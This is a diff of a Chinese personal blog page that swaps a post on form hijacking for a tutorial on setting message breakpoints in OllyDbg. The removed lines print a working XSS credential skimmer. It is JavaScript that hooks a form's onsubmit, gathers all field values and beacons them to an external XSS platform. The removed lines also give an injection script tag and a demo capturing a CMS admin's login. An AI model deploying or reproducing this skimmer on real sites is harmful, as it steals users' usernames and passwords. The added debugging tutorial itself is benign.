@@ -4,34 +4,38 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>表单劫持 | dw的博客</title>
+    <title>OD消息断点 | dw的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="dw">
     
 
     
-    <meta name="description" content="今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是http://xss.hacktask.net/ 
+    <meta name="description" content="给大家介绍下OD中怎么设置消息断点吧.
+原始程序
+随便写一个对话框程序给大家演示一下吧.
 
-在网上找了一下表单劫持方面的资料,思路大多是配合xss.js公共模块,通过修改form表单里action的地址为自己提供的地址,比如说http://www.xxxx.com/Form.php ,然后在From.php中,解析$_POST的内容达到劫持表单的功能.有兴趣的">
+12345678910111213141516171819202122232425262728#include &amp;lt;Windows.h&amp;gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hWnd,UINT msg,WPARAM wParam,LP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="表单劫持">
-<meta property="og:url" content="http://yoursite.com/2015/04/29/表单劫持/index.html">
+<meta property="og:title" content="OD消息断点">
+<meta property="og:url" content="http://yoursite.com/2015/05/02/OD消息断点/index.html">
 <meta property="og:site_name" content="dw的博客">
-<meta property="og:description" content="今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是http://xss.hacktask.net/ 
+<meta property="og:description" content="给大家介绍下OD中怎么设置消息断点吧.
+原始程序
+随便写一个对话框程序给大家演示一下吧.
 
-在网上找了一下表单劫持方面的资料,思路大多是配合xss.js公共模块,通过修改form表单里action的地址为自己提供的地址,比如说http://www.xxxx.com/Form.php ,然后在From.php中,解析$_POST的内容达到劫持表单的功能.有兴趣的">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/1.png">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/2.png">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/3.png">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/4.png">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/5.png">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/6.png">
+12345678910111213141516171819202122232425262728#include &amp;lt;Windows.h&amp;gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hWnd,UINT msg,WPARAM wParam,LP">
+<meta property="og:image" content="/img/blog_img/5月/1.png">
+<meta property="og:image" content="/img/blog_img/5月/2.jpg">
+<meta property="og:image" content="/img/blog_img/5月/3.png">
+<meta property="og:image" content="/img/blog_img/5月/4.png">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="表单劫持">
-<meta name="twitter:description" content="今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是http://xss.hacktask.net/ 
+<meta name="twitter:title" content="OD消息断点">
+<meta name="twitter:description" content="给大家介绍下OD中怎么设置消息断点吧.
+原始程序
+随便写一个对话框程序给大家演示一下吧.
 
-在网上找了一下表单劫持方面的资料,思路大多是配合xss.js公共模块,通过修改form表单里action的地址为自己提供的地址,比如说http://www.xxxx.com/Form.php ,然后在From.php中,解析$_POST的内容达到劫持表单的功能.有兴趣的">
+12345678910111213141516171819202122232425262728#include &amp;lt;Windows.h&amp;gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hWnd,UINT msg,WPARAM wParam,LP">
 
     
     <link rel="alternative" href="/atom.xml" title="dw的博客" type="application/atom+xml">
@@ -90,14 +94,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/04/29/表单劫持/" title="表单劫持" itemprop="url">表单劫持</a>
+      <a href="/2015/05/02/OD消息断点/" title="OD消息断点" itemprop="url">OD消息断点</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="dw" target="_blank" itemprop="author">dw</a>
 		
   <p class="article-time">
-    <time datetime="2015-04-29T02:22:11.000Z" itemprop="datePublished"> 发表于 2015-04-29</time>
+    <time datetime="2015-05-02T11:23:18.000Z" itemprop="datePublished"> 发表于 2015-05-02</time>
     
   </p>
 </header>
@@ -106,73 +110,76 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#思路"><span class="toc-number">1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#模块配置"><span class="toc-number">2.</span> <span class="toc-text">模块配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#演示"><span class="toc-number">3.</span> <span class="toc-text">演示</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#缺点"><span class="toc-number">4.</span> <span class="toc-text">缺点</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#原始程序"><span class="toc-number">1.</span> <span class="toc-text">原始程序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OD中截获WM_COMMAND消息"><span class="toc-number">2.</span> <span class="toc-text">OD中截获WM_COMMAND消息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内存断点法"><span class="toc-number">3.</span> <span class="toc-text">内存断点法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#函数断点法"><span class="toc-number">4.</span> <span class="toc-text">函数断点法</span></a></li></ol>
 		
 		</div>
 		
-		<pre><code>今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是<span class="string">http:</span><span class="comment">//xss.hacktask.net/ </span>
-</code></pre><blockquote>
-<p>在网上找了一下表单劫持方面的资料,思路<font color="red">大多是配合xss.js公共模块,通过修改form表单里action的地址为自己提供的地址,比如说<a href="http://www.xxxx.com/Form.php" target="_blank" rel="external">http://www.xxxx.com/Form.php</a> ,然后在From.php中,解析$_POST的内容达到劫持表单的功能.</font>有兴趣的朋友自己搜索下,这里主要介绍使用Javascript进行表单劫持,这种方法的<font color="blue">缺点会在后面给出.</font></p>
+		<pre><code>给大家介绍下<span class="variable">OD</span>中怎么设置消息断点吧.
+</code></pre><h1 id="原始程序">原始程序</h1><blockquote>
+<p>随便写一个对话框程序给大家演示一下吧.</p>
 </blockquote>
-<h1 id="思路">思路</h1><blockquote>
-<p>大家都知道,在提交form表单时会调用onsubmit方法,既然调用了onsubmit,说明表单中该填的项肯定都已经填好了,这时,我们通过修改onsubmit方法,便可以获取表单中的信息,代码如下:</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include <span class="string">"resource.h"</span></span><br><span class="line"></span><br><span class="line">BOOL <span class="function">CALLBACK <span class="title">DialogProc</span><span class="params">(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>(msg)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">		<span class="keyword">switch</span>(LOWORD(wParam))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> IDOK:</span><br><span class="line">			MessageBox(0,<span class="string">"OK"</span>,<span class="string">"OK"</span>,0);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">case</span> WM_SYSCOMMAND:</span><br><span class="line">		<span class="keyword">if</span>(LOWORD(wParam)==SC_CLOSE)</span><br><span class="line">		&#123;</span><br><span class="line">			MessageBox(<span class="number">0</span>,<span class="string">"Exit"</span>,<span class="string">"OK"</span>,<span class="number">0</span>);</span><br><span class="line">			EndDialog(hWnd,<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	DialogBox(<span class="number">0</span>,MAKEINTRESOURCE(IDD_DIALOG1),<span class="number">0</span>,DialogProc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>程序很简单，点击OK按钮出来一个提示框</p>
 </blockquote>
-<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var <span class="keyword">str</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>(var i=<span class="number">0</span>;i&lt;f.elements.length;i++) <span class="comment">//逐个获取表单的名称以及值</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">str</span>+=f.elements[i].name+<span class="string">':'</span>+f.elements[i].value+<span class="string">'||'</span>; <span class="comment">//'||'为分隔符</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">str</span>=<span class="keyword">str</span>.substr(<span class="number">0</span>,<span class="keyword">str</span>.length-<span class="number">2</span>);</span><br><span class="line">var img=<span class="keyword">new</span> Image(); <span class="comment">//使用Image提交信息</span></span><br><span class="line">img.src=<span class="string">'http://xss.hacktask.net/index.php?do=api&amp;id=&#123;projectId&#125;&amp;data='</span>+escape(<span class="keyword">str</span>)+<span class="string">'&amp;url='</span>+escape(location.href); <span class="comment">//&#123;projectId&#125;为XSS平台为你分配的id</span></span><br><span class="line">func(event); <span class="comment">//func保存之前的onsubmit方法,由于这里面可能需要执行类似编码等操作,所以这里不能直接跳过</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure>
-<h1 id="模块配置">模块配置</h1><ul>
-<li>首先在XSS平台中创建一个新的模块,模块名称和描述自己填吧,需要配置的是参数,配置参数,以及代码<center><br>  <img src="/img/blog_img/4月/表单劫持/1.png"><br></center>
+<h1 id="OD中截获WM_COMMAND消息">OD中截获WM_COMMAND消息</h1><blockquote>
+<p>开始想着是OD中选择查看-&gt;窗口,会显示当前应用程序的各个窗口,那直接找窗口处理函数,直接设断不就行了吗？很不幸,这样不行,看看下图</p>
+</blockquote>
+<center><br>    <img src="/img/blog_img/5月/1.png"><br></center>
 
-</li>
+<blockquote>
+<p>确实有确定,取消这几个按钮,而且也有我们的Dialog对话框,但是貌似处理函数跑飞了,我们自己写的处理函数怎么会位于USER32.DLL的加载空间呢？不用问，不是这个,<font color="red">仔细看下,上面写的是ClsProc,而且左边还有个WinProc</font>,我的理解是<font color="red">WinProc</font>才是你自己写的函数,但是这里OD没检测出来,那么<font color="red">ClsProc</font>是什么呢？我的理解是,在RegisterClassEx中使用的WNDCLASSEX结构体中的窗口处理函数,那么,调用顺序是怎样的呢?<font color="red">Windows会首先调用ClsProc中的处理函数,再由这个函数将消息转发给咱们自己定义的函数.</font></p>
+</blockquote>
+<ul>
+<li>说了这么多,其实总结下来就一句话:<font color="BLUE">这个ClsProc不一定靠谱</font>,当然,<font color="BLUE">一些情况下还是可以用他的</font></li>
 </ul>
 <blockquote>
-<p>在底下的代码框写入我们的代码,就OK了</p>
+<p>那么,怎么办呢？这里给大家介绍两种方法.</p>
 </blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f=<span class="built_in">document</span>.forms[<span class="string">'&#123;set.formname&#125;'</span>];</span><br><span class="line"><span class="keyword">if</span>(f==<span class="literal">undefined</span>)</span><br><span class="line">&#123;</span><br><span class="line">        f=<span class="built_in">document</span>.getElementById(<span class="string">'&#123;set.formid&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> func=f.onsubmit;</span><br><span class="line">f.onsubmit=<span class="function"><span class="keyword">function</span><span class="params">(event)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> str=<span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;f.elements.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		str+=f.elements[i].name+<span class="string">':'</span>+f.elements[i].value+<span class="string">'||'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	str=str.substr(<span class="number">0</span>,str.length-<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">var</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">	img.src=<span class="string">'http://xss.hacktask.net/index.php?do=api&amp;id=&#123;projectId&#125;&amp;data='</span>+<span class="built_in">escape</span>(str)+<span class="string">'&amp;url='</span>+<span class="built_in">escape</span>(location.href);</span><br><span class="line">	func(event);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>点击配置，完成</p>
-</blockquote>
-<h1 id="演示">演示</h1><blockquote>
-<p>这里以织梦为例,在后台那查看代码</p>
-</blockquote>
-<center><br>    <img src="/img/blog_img/4月/表单劫持/2.png"><br></center>
+<h1 id="内存断点法">内存断点法</h1><ul>
+<li><p>上面讲过,系统会<font color="RED">先调用这个ClsProc,然后再调用我们自己提供的函数</font>.看看地址空间,ClsProc显而易见是在USER32.DLL的空间(之前听有些说法是把它叫做系统空间,其实个人感觉这个不能叫系统空间,<font color="BLUE">系统空间是指你运行了特权指令,int 0x2e,sysenter以后CPU进入0环以后的空间</font>),而我们自己提供的函数肯定是位于当前应用程序的空间了,我们的目的就是找到他！</p>
+</li>
+<li><p>首先,在ClsProc的位置下条件断点.</p>
+</li>
+</ul>
+<center><br>    <center><br>        <img src="/img/blog_img/5月/2.jpg"><br>    </center><br></center>
 
 <blockquote>
-<p>然后在XSS中新建一个项目,项目名称,描述,惯例随便写,选中我们自建的模块,formname写成form1,保存.<br>复制XSS代码(如果不知道怎么做的话自行百度XSS平台使用),我这里是</p>
+<p>这里注意两点,第一个是地址77D3E577,由于动态链接库每次加载的位置都不一样，所以这个值可能是会变的;第二个是[esp+4]的值,也就是句柄值,这里也是不确定的,我是怎么得到这个值的呢？<font color="RED">注意看堆栈</font>,不多解释.</p>
 </blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">http:</span>//<span class="attribute">xss.hacktask.net</span>/<span class="attribute">9D1Q9Z</span>?<span class="attribute">1430276699</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>织梦平台上模拟XSS插入</p>
-<center><br>    <img src="/img/blog_img/4月/表单劫持/3.png"><br></center>
+<ul>
+<li>点击确定后,程序断在这里,然后ALT+M打开内存,在代码区设断</li>
+</ul>
+<center><br>    <center><br>        <img src="/img/blog_img/5月/3.png"><br>    </center><br></center>
 
+<ul>
+<li>点击运行:</li>
+</ul>
+<center><br>    <center><br>        <img src="/img/blog_img/5月/4.png"><br>    </center><br></center>
+
+<font size="30" color="GREEN">OK</font>
+
+<h1 id="函数断点法">函数断点法</h1><blockquote>
+<p>首先问一个问题:Windows系统在显示对话框时会调用什么函数?你可能想说DialogBoxA,DialogBoxW,对不起,<font color="RED">不是这两个,这两个其实不叫函数,他们只是宏定义,系统会调用DialogBoxParamA,或者DialogBoxParamW</font>.看先调用接口:</p>
+</blockquote>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DialogBoxParam</span><span class="params">(</span><br><span class="line">HINSTANCE hInstance,</span><br><span class="line">LPCTSTR lpTemplateName, </span><br><span class="line">HWND hWndParent,</span><br><span class="line">DLGPROC lpDialogFunc,</span><br><span class="line">PARAM dwInitParam)</span></span>;</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>这里操作就完成了,返回登录界面,随便登录一下</p>
-<p>熟悉的界面</p>
+<p>思路有了吧,直接在这个函数上设断,[ESP+0x10]的值就是我们要找的了.</p>
 </blockquote>
-<center><br>    <img src="/img/blog_img/4月/表单劫持/4.png"><br></center>
-
-<p>在XSS平台上看一下</p>
-<center><br>    <img src="/img/blog_img/4月/表单劫持/5.png"><br></center>
-
-<blockquote>
-<p>截获到了吧,看下内容</p>
-</blockquote>
-<center><br>    <img src="/img/blog_img/4月/表单劫持/6.png"><br></center>
-
-<h1 id="缺点">缺点</h1><blockquote>
-<p>看到这里,缺点大家应该也知道了,在输入的时候不管你的用户名密码是否正确,都会上传到XSS平台,也就是说,你截获到的账号密码不一定是正确的</p>
-</blockquote>
-<font size="30" color="green">祝大家好运^-^</font>  
+<font size="30" color="BLUE">That’s all</font>  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/hack/">hack</a>
+  <a class="article-category-link" href="/categories/逆向工程/">逆向工程</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/hack/">hack</a><a href="/tags/js/">js</a><a href="/tags/表单劫持/">表单劫持</a>
+  <span></span> <a href="/tags/C语言/">C语言</a><a href="/tags/OD/">OD</a><a href="/tags/逆向工程/">逆向工程</a>
   </div>
 
 </div>
@@ -181,7 +188,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://yoursite.com/2015/04/29/表单劫持/" data-title="表单劫持 | dw的博客" data-tsina="null" class="share clearfix">
+	  <div data-url="http://yoursite.com/2015/05/02/OD消息断点/" data-title="OD消息断点 | dw的博客" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -194,19 +201,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2015/05/02/OD消息断点/" title="OD消息断点">
-  <strong>上一篇：</strong><br/>
-  <span>
-  OD消息断点</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2015/04/28/hexo-github无域名安装/"  title="windows下hexo-github无域名安装">
+<a href="/2015/04/29/表单劫持/"  title="表单劫持">
  <strong>下一篇：</strong><br/> 
- <span>windows下hexo-github无域名安装
+ <span>表单劫持
 </span>
 </a>
 </div>
@@ -227,7 +226,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#思路"><span class="toc-number">1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#模块配置"><span class="toc-number">2.</span> <span class="toc-text">模块配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#演示"><span class="toc-number">3.</span> <span class="toc-text">演示</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#缺点"><span class="toc-number">4.</span> <span class="toc-text">缺点</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#原始程序"><span class="toc-number">1.</span> <span class="toc-text">原始程序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OD中截获WM_COMMAND消息"><span class="toc-number">2.</span> <span class="toc-text">OD中截获WM_COMMAND消息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内存断点法"><span class="toc-number">3.</span> <span class="toc-text">内存断点法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#函数断点法"><span class="toc-number">4.</span> <span class="toc-text">函数断点法</span></a></li></ol>
  
   </div>
 
